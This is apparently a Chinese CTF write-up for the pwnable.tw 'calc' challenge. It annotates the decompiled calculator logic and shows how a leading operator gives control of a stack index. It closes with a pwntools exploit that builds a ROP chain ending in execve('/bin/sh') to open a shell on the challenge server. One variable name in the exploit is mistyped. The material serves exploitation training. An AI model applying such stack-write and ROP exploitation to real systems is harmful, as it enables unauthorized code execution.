<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ssignal(<span class="number">14</span>, timeout);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Welcome to SECPROG calculator ===&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Merry Christmas!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么需要关注的点，前面部分只是设置了个超时的处理，同时在puts()的输出中我们可以直到这个程序实现的应该是一个计算器的功能。</p>
<p>calc()函数才是程序主逻辑的开始：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a2[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(s, <span class="number">0x400</span>u);                           <span class="comment">// 将s数组置零</span></span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(s, <span class="number">0x400</span>) )                  <span class="comment">// 过滤输入，限制在 +-/*% 0-9 之间</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(a2);                              <span class="comment">// a2数组置零</span></span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(s, a2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a2[a2[<span class="number">0</span>]]);                <span class="comment">// 输出结果，数组长度放在数组头，运算结果放在数组尾</span></span><br><span class="line">      fflush(<span class="built_in">stdout</span>);                           <span class="comment">// 如果能够控制a2[0]，就能任意地址读</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序在 get_expr() 函数中获取要计算的表达式，并将该表达式存放在s[]数组中，而且输入的最长长度为0x400，所以没有发生溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">get_expr</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a2 &amp;&amp; read(<span class="number">0</span>, &amp;v4, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; v4 != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="string">&#x27;+&#x27;</span> || v4 == <span class="string">&#x27;-&#x27;</span> || v4 == <span class="string">&#x27;*&#x27;</span> || v4 == <span class="string">&#x27;/&#x27;</span> || v4 == <span class="string">&#x27;%&#x27;</span> || v4 &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; v4 &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v5++;</span><br><span class="line">      a1[v2] = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[v5] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时 get_expr() 函数过滤了除运算符以及数字0-9之外的任何输入</p>
<p>程序的重点在  parse_expr() 函数内，该函数接收 s[] 和 a2[] 数组作为参数，该函数内部完成了对输入的表达式的解析以及调用 eval() 函数完成表达式的计算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> count; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> lenth; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *number; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = a1;                                      <span class="comment">// v4为数组头</span></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(s, <span class="number">0x64</span>u);                              <span class="comment">// 将s数组置零</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;                                             <span class="comment">// 遍历这个表达式，直到遇到运算符</span></span><br><span class="line">    <span class="keyword">if</span> ( a1[i] - <span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )                      <span class="comment">// 如果a[i]是运算符则进入这个if内</span></span><br><span class="line">    &#123;</span><br><span class="line">      lenth = &amp;a1[i] - v4;                      <span class="comment">// lenth == i</span></span><br><span class="line">      number = <span class="built_in">malloc</span>(lenth + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(number, v4, lenth);                <span class="comment">// 将当前包含运算符的表达式拷贝到number[]中</span></span><br><span class="line">      *(number + lenth) = <span class="number">0</span>;                    <span class="comment">// 将运算符改成结束符</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(number, <span class="string">&quot;0&quot;</span>) )               <span class="comment">// 表达式中的数字是0则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num = atoi(number);                       <span class="comment">// 字符串转数字</span></span><br><span class="line">      <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )                            <span class="comment">// 如果表达式的第一个字符是运算符，v9 == 0，这个if进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">        count = (*a2)++;                        <span class="comment">// 数组a2的数组头保存当前记录的数字的个数</span></span><br><span class="line">        a2[count + <span class="number">1</span>] = num;                    <span class="comment">// 从a2[1]开始保存每个数字</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[i] &amp;&amp; a1[i + <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )       <span class="comment">// 检查表达式中是否有0或者连续的运算符</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = &amp;a1[i + <span class="number">1</span>];                          <span class="comment">// 更新v4</span></span><br><span class="line">      <span class="keyword">if</span> ( s[v6] )                              <span class="comment">// 当次循环的时候，s[v6]保存的是前一个运算符，a1[i]保存的是当前记录的运算符</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( a1[i] )                        <span class="comment">// 根据当前运算符进行switch</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:                             <span class="comment">// 如果当前运算符是%、*、/</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v6] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; s[v6] != <span class="string">&#x27;-&#x27;</span> ) <span class="comment">// 且前一个运算符不为+或者-，则说明前一个运算符的优先级不大于当前运算符，则goto LABEL_14</span></span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            s[++v6] = a1[i];                    <span class="comment">// 如果前一个运算符为+或者-，则意味着当前运算符的优先级大于前一个运算符，则直接保存到s[v6]数组中</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(a2, s[v6]);                    <span class="comment">// 进去这里的情况是前一个记录的运算符的优先级不小于这次记录的运算符，这种情况选择直接用前一个运算符来算出那部分的结果</span></span><br><span class="line">            s[v6] = a1[i];                      <span class="comment">// 然后把这次记录的运算符保存在s[v6]，在下次循环中以此类推</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:								<span class="comment">// default对应a1[i]读到结束符的情况，这种情况表示整个表达式以及读完，程序开始从右往左开始计算</span></span><br><span class="line">            eval(a2, s[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;                              <span class="comment">// 这一整块if和switch实现的是根据这次记录的运算符和前一个运算符之间优先级来进行不同的操作：</span></span><br><span class="line">        &#125;                                       <span class="comment">// 如果这一次记录的运算符的优先级不小于前一个运算符的话，则直接保存到s[++v6]中。相反如果前一个运算符的优先级不小于当前记录的运算符的话，则直接把前一个运算符的式子先算出来</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v6] = a1[i];                          <span class="comment">// a1[i]是运算符，给到s[v6]</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !a1[i] )                             <span class="comment">// 检测到结束符break</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )                             <span class="comment">// 实现将表达式从右到左依次计算完成</span></span><br><span class="line">    eval(a2, s[v6--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能如上标注</p>
<p>跟进到 eval() 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">eval</span><span class="params">(_DWORD *a1, <span class="keyword">char</span> symbol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( symbol == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( symbol &gt; <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( symbol == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( symbol == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - <span class="number">1</span>] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( symbol == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - <span class="number">1</span>] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1;</span><br><span class="line">  --*a1;                                        <span class="comment">// --a2[0]</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个程序的逻辑需要一定时间去理解，理解了之后就会发现最重要的一个洞在于如果输入的第一个字符是运算符的话会导致a2[0]是能被我们控制的，进而在 calc() 函数中的 printf() 中就相当于控制了其打印的内容，从而完成任意地址泄漏。</p>
<p>更进一步，例如在表达式中输入 <code>+360+370</code> 这样的数据，在 parse_expr() 中这段表达式会形成三次循环，loop1中运算符‘+’被保存在 s[v6] 中，loop2之后 a2[0] == 360 （按程序逻辑走一遍就知道了），这是在loop3中就会先将 ‘370’ 赋值给a2[361]，然后在 eval() 中执行 a2[360] = a2[360] + a2[361]，也就是相当于让 a2[360] 自增了 ‘370’，而且因为a2[]是在栈上的，所以我们就相当于有了控制栈上数据的能力。</p>
<p>比如一个栈上的数据是 0xdeadbeef ，我们想要将这个数据修改成 0x11223344（只是例子），那么我们首先将这个栈上的数据泄漏出来，然后用上面说的一样的方法，输入“这个数据的相反数+想要修改成的数据”就可以了，具体的看exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x080701d1</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span></span><br><span class="line">int_80 = <span class="number">0x08049a21</span></span><br><span class="line">str_bin = <span class="number">0x6e69622f</span></span><br><span class="line">str_sh = <span class="number">0x68732f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x8049411&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;+360&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>))</span><br><span class="line">binsh = stack_addr+<span class="number">4</span></span><br><span class="line">stack_addr = (stack_addr&amp;<span class="number">0xffffffff</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset,value</span>):</span></span><br><span class="line">	p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset))</span><br><span class="line">	a = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>))</span><br><span class="line">	b = -a+value</span><br><span class="line">	<span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">		payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="built_in">str</span>(b)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(b)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">361</span>,pop_eax)</span><br><span class="line">write(<span class="number">362</span>,<span class="number">11</span>)</span><br><span class="line">write(<span class="number">363</span>,pop_ecx_ebx)</span><br><span class="line">write(<span class="number">364</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">365</span>,binsh)</span><br><span class="line">write(<span class="number">366</span>,pop_edx)</span><br><span class="line">write(<span class="number">367</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">368</span>,int_80)</span><br><span class="line">write(<span class="number">369</span>,str_bi)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x8049411&quot;)</span></span><br><span class="line">write(<span class="number">370</span>,str_sh)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">30</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
